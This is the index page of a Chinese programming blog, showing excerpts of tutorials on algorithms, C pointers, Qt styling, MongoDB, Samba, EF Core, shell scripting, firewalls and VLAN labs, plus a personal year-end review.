<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73bcfc2ed28b8fdac43ad840b25f106c/" rel="bookmark">
			【码极客精讲】回溯算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		回溯算法实际上一个类似枚举的搜索尝试过程，主要是在搜索尝试过程中寻找问题的解，当发现已不满足求解条件时，就“回溯”返回，尝试别的路径。回溯法是一种选优搜索法，按选优条件向前搜索，以达到目标。但当探索到某一步时，发现原先选择并不优或达不到目标，就退回一步重新选择，这种走不通就退回再走的技术为回溯法，而满足回溯条件的某个状态的点称为“回溯点”。许多复杂的，规模较大的问题都可以使用回溯法，有“通用解题方法”的美称。
来源 回溯算法也叫试探法，它是一种系统地搜索问题的解的方法。
用回溯算法解决问题的一般步骤：
1、 针对所给问题，定义问题的解空间，它至少包含问题的一个（最优）解。
2 、确定易于搜索的解空间结构,使得能用回溯法方便地搜索整个解空间 。
3 、以深度优先的方式搜索解空间，并且在搜索过程中用剪枝函数避免无效搜索。
确定了解空间的组织结构后，回溯法就从开始结点（根结点）出发，以深度优先的方式搜索整个解空间。这个开始结点就成为一个活结点，同时也成为当前的扩展结点。在当前的扩展结点处，搜索向纵深方向移至一个新结点。这个新结点就成为一个新的活结点，并成为当前扩展结点。如果在当前的扩展结点处不能再向纵深方向移动，则当前扩展结点就成为死结点。此时，应往回移动（回溯）至最近的一个活结点处，并使这个活结点成为当前的扩展结点。回溯法即以这种工作方式递归地在解空间中搜索，直至找到所要求的解或解空间中已没有活结点时为止。 基本思想 回溯算法的基本思想是：从一条路往前走，能进则进，不能进则退回来，换一条路再试。八皇后问题就是回溯算法的典型，第一步按照顺序放一个皇后，然后第二步符合要求放第2个皇后，如果没有位置符合要求，那么就要改变第一个皇后的位置，重新放第2个皇后的位置，直到找到符合条件的位置就可以了。回溯在迷宫搜索中使用很常见，就是这条路走不通，然后返回前一个路口，继续下一条路。回溯算法说白了就是穷举法。不过回溯算法使用剪枝函数，剪去一些不可能到达 最终状态（即答案状态）的节点，从而减少状态空间树节点的生成。回溯法是一个既带有系统性又带有跳跃性的的搜索算法。它在包含问题的所有解的解空间树中，按照深度优先的策略，从根结点出发搜索解空间树。算法搜索至解空间树的任一结点时，总是先判断该结点是否肯定不包含问题的解。如果肯定不包含，则跳过对以该结点为根的子树的系统搜索，逐层向其祖先结点回溯。否则，进入该子树，继续按深度优先的策略进行搜索。回溯法在用来求问题的所有解时，要回溯到根，且根结点的所有子树都已被搜索遍才结束。而回溯法在用来求问题的任一解时，只要搜索到问题的一个解就可以结束。这种以深度优先的方式系统地搜索问题的解的算法称为回溯法，它适用于解一些组合数较大的问题。上面的八皇后问题应该很多C++学僧都知道。
算法框架 （pascal语言）
procedure try(i:integer); var begin if i&gt;n then 输出结果 else for j:=下界 to 上界 do begin x[i]:=h[j]; if 可行{满足限界函数和约束条件} then begin 置值；try(i+1); end; end; (⊙o⊙)…没有Pascal代码段插入。
（c++）以下以一道题目为例，素数环问题
将从1到n这n个整数围成一个圆环，若其中任意2个相邻的数字相加，结果均为素数，那么这个环就成为素数环。
#include&lt;iostream&gt; #include&lt;cmath&gt; #include&lt;cstdio&gt; using namespace std; int ans[21] = {0}, tot = 0; bool a[21] = {0}; void print(){ tot++; cout &lt;&lt; "No." &lt;&lt; tot &lt;&lt; ':'; for (int i = 1; i &lt;= 20; i++) cout &lt;&lt; ans[i] &lt;&lt; ' '; cout &lt;&lt; endl; } bool isprime(int x1, int x2){ int i = x1 + x2,f; for (f = 2; f &lt;= sqrt(i); f++) if (i % f == 0) return false; return true; } int search(int t){ for (int i = 1; i &lt;= 20; i++){ if (a[i] == false &amp;&amp; isprime(ans[t - 1], i)){ ans[t] = i; a[i] = true; if (t == 20 &amp;&amp; isprime(ans[1], ans[20])) print(); else search(t + 1); a[i] = false; } } } int main() { search(1); printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/73bcfc2ed28b8fdac43ad840b25f106c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cdf8cd3848743821404d07348d7634a8/" rel="bookmark">
			指针进阶之字符指针（超详细）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、回顾二、字符指针1.基本用法2.误区（1）字符指针存放字符串首元素地址（2）输出问题 3.内存布局 三、字符指针与字符串数组1.字符指针2.字符串数组 四、面试题1.One2.Two3.探究4.补充 五、地址问题六、字符数组与字符串数组1.sizeof与strlen含义示例一示例二说明 代码三代码四总结 2.字符数组与字符串数组示例一示例二总结 一、回顾 指针的主题，我们在(2条消息) C语言基础–初识指针_雨翼轻尘的博客-CSDN博客已经接触过了。我们知道了指针的概念：
1、 指针就是个变量，用来存放地址，地址唯一标识一块内存空间。
2、 指针的大小是固定的4/8个字节（32平台/64平台）。
3、 指针有类型，指针的类型决定了指针的±整数的步长，指针解引用操作的时候的权限。
4、 指针的运算。
这一章节，我们继续探讨。
首先再来说明一下指针大小的问题。
看如下代码，输出结果是多少呢？
#include&lt;stdio.h&gt; void test(int arr[]) { int sz = sizeof(arr) / sizeof(arr[0]); printf("%d\n", sz); } int main() { int arr[10] = { 0 }; test(arr); } 分析一下这个函数：
void test(int arr[]) {//arr是指针变量 int sz = sizeof(arr) / sizeof(arr[0]); //sizeof(arr)求指针大小--&gt;4个字节(32平台) //sizeof(arr[0])是求一个元素的大小，整型--&gt;4个字节 //于是：sizeof(arr)/sizeof(arr[0])=4/4=1 printf("%d\n", sz); } 经过分析，输出结果是1。
在编辑器里面运行也是1：
有的小伙伴说，我输出的是2啊？
别急，我配置一下这个地方。
如图，打开配置管理器：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cdf8cd3848743821404d07348d7634a8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c7fba4b8f568d9a8d95579ab855ec432/" rel="bookmark">
			qt-qss之QCheckbox样式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、前言 QSlider样式
二、环境 qt5.7
window8
三、正文 效果：
qss：
QCheckBox{ border: none;/*最外层边框*/ } QCheckBox::indicator{/*选择框尺寸*/ background-color: rgba(255, 255, 255, 0); border: 0px solid #b1b1b1; width: 30px; height: 30px; } QCheckBox:enabled:checked{ color: rgb(255, 255, 255); } QCheckBox:enabled:!checked{ color: rgb(255, 255, 255); } QCheckBox:enabled:hover{ color: rgb(0, 200, 0); } QCheckBox:!enabled{ color: rgb(80, 80, 80); } QCheckBox::indicator:unchecked { image: url(:/pic/1441292778_351283.png); } QCheckBox::indicator:unchecked:hover { image: url(:/pic/1441292778_351283.png); } QCheckBox::indicator:unchecked:pressed { image: url(:/pic/1441292778_351283.png); } QCheckBox::indicator:checked { image: url(:/pic/1441292784_170770.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c7fba4b8f568d9a8d95579ab855ec432/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f06cd5bd31af60a463503089bbc72f83/" rel="bookmark">
			回味2022
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		回味2022 1.前言2.过去的十二个月3.我期望的2023 1.前言 2021年写给自己的总结：回味2021
一年又一年飞逝的光阴，我想唯有时间留给人的印象最为深刻吧。春去秋来，四季轮回间都是时光的印记。2022年12月30日，25岁的我依旧在这间写下2021年总结的屋子里，趴在这熟悉的桌前，敲下这段对2022的总结和回忆。好似2022从未来过，好似还在写2021年没有写完的篇章。一年的时光，转瞬即逝，自毕业以来，我有无数次的感叹时间流逝之快，快的让人始料未及，但却束手无策。一年的时间在平平淡淡的上班，下班，周末休息这样周而复始的状态中一点点的流逝。
毕业一年半的时间，感受最为深刻的一点就是自离开校园那一刻起，生活变得越加的平淡无奇。2021年的时光算是从校园时光到工作环境的一个过渡，到了这2022，这种平淡的感觉愈加的明显。浑浑噩噩的周末，周而复始的工作，陌生城市的孤独，依旧是生活的常态。
2022年一年的时间，我做了些什么？翻着自己这一年来发的朋友圈，想要探究下这转瞬飞逝的一年的每个月我做了些什么事，有这怎样的状态。
2.过去的十二个月 一月
一月底是快过年要放假的日子，不巧的是在这即将过年的短短三天内，杭州确诊超过百例，但是因为快两年没有回家，所以还是硬着头皮踏上了回家的飞机。可是结果不尽如意，在老家的机场管控了三个多小时，不让出去，要么拉去集中隔离，要么原路返回，我第一次感受到原本那样可爱，那样纯洁的故乡净土，也变得世俗和不讲人情，于是隔着机场玻璃见了见家人后踏上了回杭州的飞机。这场回家之旅共计17个小时。
二月
杭州的疫情基本也过去了，除了日常忙碌的工作，也抽时间见了见老同学，每次的相逢，感觉又回到了大学最美的那几年。
三月、四月
作为无数打工人中的一员，也和他们一样过着朝九晚八的生活，白天忙工作，晚上如果项目赶得急就加班，如果下班比较早就看看技术类文章或者学一些东西。最普通平常的一段日子。
五月、六月
五月，家里迎来了一直小东西，在外面漂泊了快一年，一年的时间回到家都是一个人，那种孤独感早已沁入心脾，可自从家里来了这小东西，一下子感觉生活有了盼头。下班回到家看到他跟在屁股后面要吃的，晚上能够陪着小东西玩一会儿，看着他玩累了趴在怀里，感觉在外漂泊的日子也变得不在痛苦和乏味。
七月、八月
这段时间大概是最忙的时候吧，从四月底换了项目组，五月六月基本在熟悉项目学习新项目有关的内容，七月八月就着手新的需求的开发，面对不熟悉的项目和不熟悉的开发语言，每一个接手的问题和需求都是对自己的挑战，那段时间每天沉浸在无穷无尽的日志中排查线上问题，查问题和写代码占据了绝大多数的时间，最忙碌最辛苦，也是收获颇多的一段时间。忙碌的日子也让自己想了很多的事情，不知道未来的路如何走，但觉得不能迷迷糊糊的忙下去，应该有自己的想法。
九月、十月
在九月的团建中去了千岛湖，两日的游玩，和团队里的成员熟悉不少，也是几次团建中体验最佳的一次。两天的散心时间确实玩的尽兴，从去年毕业到现在，这应该是第一次感觉到集体活动的快乐。
十月，因为过年没能正正的回家，所以想借着国庆假期的时间回趟家，可事与愿违，老家迎来了又一波的疫情，回家的愿望再一次落空。于是调整心情，收拾行囊，打算出去走走，去厦门，看看鼓浪屿和海滩。
十一月、十二月
迎来了2022年最后的两个月，依旧有条不紊的进行着手头的工作，完成一系列的需求。不同的是随着时间的推移，当接到新的需求时，不再像前几个月那样惶恐不安，担心自己完成不了。而是多了几分坦然，每天按部就班的完成着手头的工作。
十二月的最后一周，工位对面的同事阳了，然后回家居家办公，紧接着第二天就出现了咳嗽，浑身难受的症状，2022年的最后一周，和疫情放开吼感染的第一波人一样，自己也阳了。历经波折，最终也未能幸免。
一年的时间，就这样在一日日的工作和生活中流逝，平淡但也安稳，无波无澜但也过的问心无愧。还完了四万多的欠款，完成了去厦门看海的心愿。工作上也自认为足够努力上进。与无数在外漂泊的谋生者一般，在春去秋来总朝九晚八。
3.我期望的2023 现在是2022年12月31日晚20点40，还有几个小时时间就要向2022挥手告别，迎来新的一年。
我希望新的一年能够过的刚加充实有意义。弥补之前的遗憾，工作更加的上进。如果有更好的发展机会，也希望自己能够牢牢把握。对于自己心心念念了一年的自媒体，也希望在新的一年里能开始着手准备。能够勇敢的走出第一步，坚持不懈，大胆的干。
希望新的一年，能够有更好的运气和更多的努力，2023加油！
2022年立下的flag你们都完成了吗
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a93c6e1d0e6346850fc688b200a6c6a7/" rel="bookmark">
			已安装成功的Python包，无法被IDE解析的解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这问题本质说就是IDE未正确识别到，python包的安装路径，解决方法就是将该路径添加到IDE中。具体实现方法如下：
1. 找到Python包安装路径 不论在 Linux 操作系统还是在 Windows 操作系统中，均可以通过在命令行中输入python -m site命令，查询到当前设定的python包安装地址，如下图所示。按返回结果确认正确地址后添加到IDE中。
2. 添加Python包安装路径 2.1 在操作系统中添加Python包安装路径 Linux平台上，在根目录下的.bashrc文件中添加该路径即可一劳永逸的解决路径添加问题，代码如下所示：
echo 'PATH=$PATH:/opt/conda/lib/python3.9/site-packages'&gt;&gt;~/.bashrc 2.2 在IDE中添加Python包安装路径 在 VsCode 是 pylance 插件没有识别出python包的路径，引发了本错误。解决方法是打开设置，在搜索框输入"python.analysis.extraPaths"并添加相关地址，如下图所示。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1347eb73a65cb1c987eb5c2e72e3d838/" rel="bookmark">
			MongoDB介绍/安装/使用/SpringBoot内操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MongoDB介绍/安装/使用/Spring操作 MongoDBMongoDB介绍简介特点对比MySQL数据库结构语法数据类型 安装和连接创建操作删除操作更新操作读取操作正常查询分页查询排序高级查询比较查询逻辑查询模糊查询 数组 -- $push添加元素删除元素修改元素通过索引修改通过元素修改 Spring Data MongoDB准备环境配置连接参数domainMongoRepositorySpring Data方法命名规范TestMongoTemplate条件查询API方法API使用 MongoDB MongoDB介绍 简介 MongoDB是一个基于分布式文件存储的数据库。由C++语言编写。旨在为WEB应用提供可扩展的高性能数据存储解决方案。
MongoDB是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。它支持的数据结构非常松散，是类似json的bson格式，因此可以存储比较复杂的数据类型。Mongo最大的特点是它支持的查询语言非常强大，其语法有点类似于面向对象的查询语言，几乎可以实现类似关系数据库单表查询的绝大部分功能，而且还支持对数据建立索引。
2019 数据库最受欢迎排行榜 (baidu.com)
特点 高性能易部署易使用非常方便的存储数据 对比MySQL MongoDBMysql数据库模型非关系型关系型存储方式虚拟内存 + 持久化不同存储引擎有不同的存储方式查询语句独特的MongoDB查询方式传统SQL语句架构特点可以通过副本集，以及分片来实现高可用常见也有单点，M-S，MHA，MMM，Cluster等架构数据处理方式基于内存，将热数据存在物理内存中，从而达到高速读写不同的引擎拥有其自己的特点成熟度新兴数据库，成熟度低拥有较为成熟的体系，成熟度较高广泛度NoSQL数据库中，MongoDB是较为完善的DB之一，使用人群也在不断增长开源数据库的份额在不断增加，MySQL的份额也在不断增长 目前环境下，只要对事务要求不高的业务都能被MongoDB所取代，属于及其热门的NoSQL数据库
数据库结构 MongoDB属于NoSQL数据库，自然也是没有表相关的概念的，该数据库存储使用的是集合，集合中存储的是文档（树状结构数据）
语法 show dbs --查询所有数据库 use 数据库名 --创建并且选中数据库，数据库已经存在则直接选中 db --查询当前选择的数据库 db.dropDatabase() --删除当前选中的数据库 show collections --查询当前库中的集合 db.createCollection("集合名") --创建集合 db.集合名.drop() --删除集合 注意： db.集合名 == db.getCollection("集合名") 数据类型 String（字符串）: mongodb中的字符串是UTF-8有效的 Integer（整数）: 存储数值。整数可以是32位或64位，具体取决于您的服务器 Boolean（布尔）: 存储布尔(true/false)值 Double（双精度）: 存储浮点值 Arrays（数组）: 将数组或列表或多个值存储到⼀个键中 Timestamp（时间戳）: 存储时间戳 Object（对象）: 嵌⼊式⽂档 Null （空值）: 存储Null值 Symbol（符号）: 与字符串相同，⽤于具有特定符号类型的语⾔ Date（⽇期）: 以UNIX时间格式存储当前⽇期或时间 Object ID（对象ID） : 存储⽂档ID Binary data（⼆进制数据）: 存储⼆进制数据 Code（代码）: 将JavaScript代码存储到⽂档中 Regular expression（正则表达式）: 存储正则表达式 安装和连接 懒得重新安一遍，直接找个安装教程
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1347eb73a65cb1c987eb5c2e72e3d838/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/50a2e04ae4e4157c1ee1408219e78f7d/" rel="bookmark">
			SHELL脚本 遍历文件夹下所有文件以及子文件夹
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SHELL脚本 遍历文件夹下所有文件以及子文件夹 dir 要设置为局部变量 如果设置为全局变量 在func递归时传入的参数 会改变 dir的值，将导致之后的文件目录错误（为更改后的dir值）
当前目录情况：
执行完shell后：
附上代码：
#!/bin/bash func (){ local dir="$1" #local局部变量标识符 for f in `ls $1` do if [ -f "$dir/$f" ] # $dir/$f 保障路径正确 then echo "$dir/$f 是文件" elif [ -d "$dir/$f" ] then echo "$dir/$f是目录" func "$dir/$f" #如果是目录再次进行遍历 else echo "$dir/$f未知" fi done } func /root/test # func 的第一个参数也就是$1 如有不对，感谢指出。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9657c44499726aa8b51d3ded4e80dc6/" rel="bookmark">
			ubuntu下的samba配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ubuntu下的samba配置 1、在Ubuntu下安装Samba服务2、Samba服务的组成3、Samba的配置文件的语法4、Samba组成5、设置共享目录。6、修改配置文件7、定制Samba的用户8、重新启动服务9、使用 1、在Ubuntu下安装Samba服务 $sudo apt-get install smaba $sudo apt-get install smbfs //暂不需要 2、Samba服务的组成 Samba的核心是两个守护进程smbd和nmbd。当然，它们的配置信息都保存在/etc/samba/smb.conf里面。 其中smbd处理Samba软件与Linux协商，nmbd使其他主机能浏览Linux服务器。 3、Samba的配置文件的语法 配置文件就放在/etc/samba/下，名字叫作smb.conf。 sudo cp /etc/samba/smb.conf /etc/samba/smb_conf_backup //备份配置 一个完整的smb.conf配置文件有两部分组成Global Settings(全局参数设置）和Share Definitions（共享定义）组成。
每个部分有消息头和参数构成，如[global]就是一个消息头，用[]标志。
而参数的结构形式是parameter = value。
注释用#表示，这个和shell脚本有点像
而你会发现有一些前面有;号，这个表示这一行的配置可以更改，修改就要去掉;，让配置起作用。
4、Samba组成 （1）Samba Global Settings 全局参数设置
该部分由[global]段来完成配置，主要是设置整体的规则，有个参数一般要修改的是workgroup=mygroup，此句提供NT域名或者工作组名，是必须根据实际修改的。
(2)Share Definitions 共享定义
有很多段，都用[]标志开始的，这里要自己根据情况修改。
5、设置共享目录。 反正随便设置一个目录给别人访问就行了，第一次配置，也就不考虑太多。 $sudo mkdir -p /home/share/samba $sudo chmod 777 /home/share/samba 6、修改配置文件 （1）global修改的地方，防止乱码产生 [global] workgroup = WORKGROUP //设定 Samba Server 所要加入的工作组或者域 display charset = UTF-8 unix charset = UTF-8 dos charset = cp936 （2）在文本最后添加Share段，其中/home/share/samba是共享目录
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f9657c44499726aa8b51d3ded4e80dc6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4476ac1e0e22fb280f1684fbfffdc28d/" rel="bookmark">
			Entity Framework Core基础入门使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、官方文档二、创建项目三、新建数据库和表四、编写代码1、数据库的连接字符串2、增删改查操作 五、反向工程1、先决条件2、反向生成代码 一、官方文档 Entity Framework Core文档
二、创建项目 三、新建数据库和表 其中表的名称为TestTable.
四、编写代码 1、数据库的连接字符串 2、增删改查操作 using Microsoft.EntityFrameworkCore; namespace EFCore.Demo { public class Program { static async Task Main(params string[] args) { using var context = new MyDbContext(); // await Add(); // await Query(); // 根据Id查询数据后进行更新 var data = await context.TestTable.FindAsync(1); // data.Content = "这是修改测试"; // 删除数据 context.Remove(data); await context.SaveChangesAsync(); } /// &lt;summary&gt; /// 新增 /// &lt;/summary&gt; /// &lt;returns&gt;&lt;/returns&gt; static async Task Add() { using (var context = new MyDbContext()) { for (int i = 0; i &lt; 100; i++) { context.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4476ac1e0e22fb280f1684fbfffdc28d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/409076f39ff7d85b40f1e05036009de6/" rel="bookmark">
			ArcGIS基础：构建点对连线表达点集内部相互关系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原始数据如下，为普通的点图层，总共是21个点。
点位分布如下：
属性表打开如下：
下面使用【构造视线】工具进行操作，其工具位于【3D分析工具】下的【可见性】工具栏。
打开【构造视线】对话框，把【视点分析】和【目标要素】里输入上述点要素，并设置输出名称和位置，其他保持默认。
如下所示，为点对之间的连线结果的视觉效果：
如下所示，打开属性表可以查看点对的连接情况，总共是441条。
【清除多余的点对】，由于一些点对是多余的，需要去除，方法是使用【按属性选择】工具进行处理，如下所示，选择之后可以将数据导出就行。
如下所示，为清除多余数据之后的结果，打开属性表发现，总共是420条。
同样的，如果只是对一些特殊的点构建点对连线也是可以的，工具是同一个，操作如下：
相对于之前的设置，只需要把【连接字段】设置为自己想要处理的字段即可，其他的保持默认，如下所示：
如下为处理后的结果图和属性表字段。
如果不喜欢默认的颜色，可以自己更改颜色和粗细情况，如下：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/704ee389633a0e2e62b6b006f8a0c4ef/" rel="bookmark">
			算法设计与分析——数塔问题（Java）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【问题】如下图（一个5层数塔）所示的一个数塔，从数塔的顶层出发，在每一个结点可以选择向左走或向右走，一直走到最底层，要求找出一条路径，使得路径上的数值和最大。例如，下图所示数塔的最大数值和是 8+15+9+10+18=60。
【想法】观察上图（一个5层数塔）所示数塔不难发现，从 5 层数塔的顶层（设顶层为第 1 层）出发，下一层选择向左走还是向右走取决于两个 4 层数塔的最大数值和，如下图（数塔问题的子问题具有重叠关系）所示，显然，子问题具有重叠的特征。
如何找到子问题满足的动态规划函数呢？显然，动态规划的求解需要从底层开始进行决策，图（一个5层数塔）所示数塔问题的决策过程如下图（数塔问题的决策过程）所示，具体过程如下。
求解初始子问题：底层的每个数字可以看作 1 层数塔，则最大数值和就是其自身，填写图（数塔问题的决策过程）最下一行。
再求解下一阶段的子问题：第 4 层的决策是在底层决策的基础上进行求解，可以看作 4 个 2 层数塔，如下图（数塔问题的动态规划求解过程）(a) 所示，对每个数塔进行求解，填写图（数塔问题的决策过程）的第 4 行。
再求解下一阶段的子问题：第 3 层的决策是在第 4 层决策的基础上进行求解，可以看作 3 个 2 层的数塔，如如下图（数塔问题的动态规划求解过程）(b) 所示，对每个数塔进行求解，填写图（数塔问题的决策过程）的第 3 行。 依此类推，直到最后一个阶段：第 1 层的决策结果就是数塔问题的整体最优解。
由上述填表过程，可以设计数塔问题的存储结构。将给定的数塔存储为如下图（数塔的存储）所示
下三角矩阵 d[ n ][ n ]，设二维数组 maxAdd[ n ][ n ] 存储动态规划每一步的决策结果，最后maxAdd[ 0 ][ 0 ]存储的就是数塔问题的最优解，则得到如下动态规划函数：
为了求得最大数值和的路径，设数组 path[ n ][ n ] 保存每一次决策所选择的数字在数组 d[ n ][ n ]中的列下标，例如，path[ i ][ j ] 的值表示在第 i 层第 j 个数塔的决策时选择的路径，path[ i ][ j ] 的值定义如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/704ee389633a0e2e62b6b006f8a0c4ef/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/308e9e61b634d2285e453ef0db8f25ae/" rel="bookmark">
			厂商防火墙
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		华为防火墙
g0/0/0是管理口，主机管理
管理口默认用户名admin 密码Admin@123默认IP地址192.168.0.1
配置允许管理
service-manage all permit 放行端口的请求
防火墙接口配置对应IP(华为防火墙可以基于接口进行划分区域(local表示防火墙本身、Trust表示信任区域一般于连接内网客
户机网untrust表示非信任区域一般连接wan dmz表示非军事化区域一般用连接对外服务区域))
1，状态检测防火墙
基于ACL规则 (数据包的五元组)来控制流量
一般部署在网络的边界 (内外网边界、内网划分了多个区域，放置在区域的边界)
2，无法防御应用层
web应用防火墙
对于web服务器专项防护。主要检测http和https流量
一般部署在web服务器的前置。访问web服务器的流量需要经过web应用防护墙
3下一代防火墙
号称拥有入侵防御、防病毒、WAE、传统防火墙等一系列功能
深信服的下一代防火墙
勒索病毒的专项防护
规则很粗略
4、上网行为管理
针对内网上网的用户进行行为管控
一般部署在内网终端的前置
行为管控
需要对于上网的用户进行用户认证
上网权限控制(应用、关键字、邮件、QQ白名单等)
上网审计 (邮件、访问网站、IM聊天等等)
流量管理: 控制内网上网带宽
5，数据库防火墙/数据审计
关系型数据库：使用sql语句
非关系型数据库：提升查询效率
专门针对数据库的服务器进行防护，针对客户机对数据库的高危操作(删除操作、修改操作等等)进行阻挡
一般部署在数据库的前置
数据库审计
用户对数据库的所有操作进行审计 (记录) ，再根据设备中高危规则进行预警
一般旁挂在数据库一端 端口镜像·
6.入侵检测ids/入侵防御
入侵检测
针对外部攻击进行检测
一般旁挂在交换机一端
7、网闸
网闸是使用带有多种控制功能固态开关读写介质，连接两个独立主机系统的信息安全设备。由于两个独立的主机系统通过网闸进行隔离，使系统间不存在通信的物理连接、逻辑连接及信息传输协议，不存在依据协议进行的信息交换，而只有以数据文件形式进行的无协议摆渡。因此，网闸从物理上隔离、阻断了对内网具有潜在攻击可能的一切网络连接，使外部攻击者无法直接入侵、攻击或破坏内网，保障了内部主机的安全。 [1]
8、日志审计
日志审计系统是用于全面收集企业IT系统中常见的安全设备、网络设备、数据库、服务器、应用系统、主机等设备所产生的日志（包括运行、告警、操作、消息、状态等）并进行存储、监控、审计、分析、报警、响应和报告的系统。 9、堡垒机
堡垒机，即在一个特定的网络环境下，为了保障网络和数据不受来自外部和内部用户的入侵和破坏，而运用各种技术手段监控和记录运维人员对网络内的服务器、网络设备、安全设备、数据库等设备的操作行为，以便集中报警、及时处理及审计定责。
10、态势感知
态势感知是一种基于环境的、动态、整体地洞悉安全风险的能力，是以安全大数据为基础，从全局视角提升对安全威胁的发现识别、理解分析、响应处置能力的一种方式，最终是为了决策与行动，是安全能力的落地。 11、终端安全管理系统EDR
终端安全响应系统（EDR）是传统终端安全产品在高级威胁检测和响应方面的扩展和补充，通过威胁情报、攻防对抗、机器学习等方式，从主机、网络、用户、文件等维度来评估企业网络中存在的未知风险，以行为软件为核心，利用威胁情报，缩短威胁从发现到处置的时间，有效降低业务损失，增加可见性，提升整体安全能力。
vpn
vpn虚拟专用网
ipsecvpn:两个局域网之间通过vpn设备建立安全隧道
远程访问vpn(sslvpn):外网通过访问vpn设备建立安全隧道
ike密钥交互协议。使用非对称加密算法。用于协商对称加密密钥 500 认证4500
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/308e9e61b634d2285e453ef0db8f25ae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54407f27203a46245e9a05a01aaf7977/" rel="bookmark">
			【踩坑】使用maven命令mvn clean package-Dmaven.test.skip=true打包报错Unknown lifecycle phase “package-Dmaven.test
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在IDEA下方工具栏Terminal打开命令窗口，然后使用Maven命令将项目打包，执行命令为 mvn clean package-Dmaven.test.skip=true，报错如下： 解决办法 修改命令为 ：
mvn clean package '-Dmaven.test.skip=true' 或者不要使用PowerShell命令行模式：在cmd窗口执行mvn clean package -Dmaven.test.skip=true。
题外： -DskipTests，不执行测试用例，但编译测试用例类生成相应的class文件至target/test-classes下。
-Dmaven.test.skip=true，不执行测试用例，也不编译测试用例类。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fed12d8ef6bcba9f38891e3d88cc9ac4/" rel="bookmark">
			实验三 配置和实施VLAN
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录
实验三 配置和实施VLAN
实验要求：
网络拓扑图：
操作步骤：
1、配置SW2，创建vlan10和vlan20，Ethernet0/0/2加入vlan10，Ethernet0/0/3加入vlan20
2、检查SW2的接口，确认Etherent0/0/2和Ethernet0/0/3都是Access接口，并且加入vlan10和vlan20
3、检查SW2的vlan数据库，确认vlan10和vlan20存在，并且有对应的转发接口
